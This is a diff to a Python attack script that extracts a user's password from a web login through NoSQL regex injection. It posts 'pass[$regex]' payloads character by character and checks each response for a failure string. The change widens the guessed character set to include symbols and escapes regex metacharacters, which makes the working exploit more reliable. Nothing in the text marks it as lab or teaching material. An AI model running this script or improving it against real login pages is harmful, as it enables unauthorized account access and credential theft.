@@ -1,6 +1,8 @@
 import requests
 import argparse
 import sys
+import string
+import re
 
 # ==============================================================================
 # TERMINAL USAGE EXAMPLES
@@ -19,7 +21,8 @@ parser.add_argument("-pl", "--length", type=int, help="Password length")
 parser.add_argument("-f", "--fail", required=True, help="String that identifies a failed attempt")
 args = parser.parse_args()
 
-characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+# Includes lowercase, uppercase, digits, and all punctuation/special symbols
+characters = string.ascii_letters + string.digits + string.punctuation
 password = ""
 
 print(f"[*] Target URL: {args.url}")
@@ -33,10 +36,11 @@ try:
             
         found_char = False
         for char in characters:
-            # The ^ anchors to start, .* handles the unknown trailing characters
-            regex_payload = f"^{password}{char}.*$"
+            # re.escape(password + char) ensures special chars like '*' or '.' 
+            # don't break the regex logic by treating them as literal text.
+            safe_payload = re.escape(password + char)
+            regex_payload = f"^{safe_payload}.*$"
             
-            # Using the username argument in the POST data
             data = {
                 "user": args.username, 
                 "pass[$regex]": regex_payload, 
@@ -44,13 +48,9 @@ try:
             }
             
             try:
-                # allow_redirects=False captures the 302 Found header immediately
                 response = requests.post(args.url, data=data, allow_redirects=False, timeout=5)
-                
-                # Combine headers and body to ensure we catch 'err=1' or 'Invalid' anywhere
                 full_raw_response = str(response.headers) + response.text
                 
-                # If the failure string is NOT in the response, we found the right char
                 if args.fail not in full_raw_response:
                     password += char
                     print(f"[+] Found character: {password}")
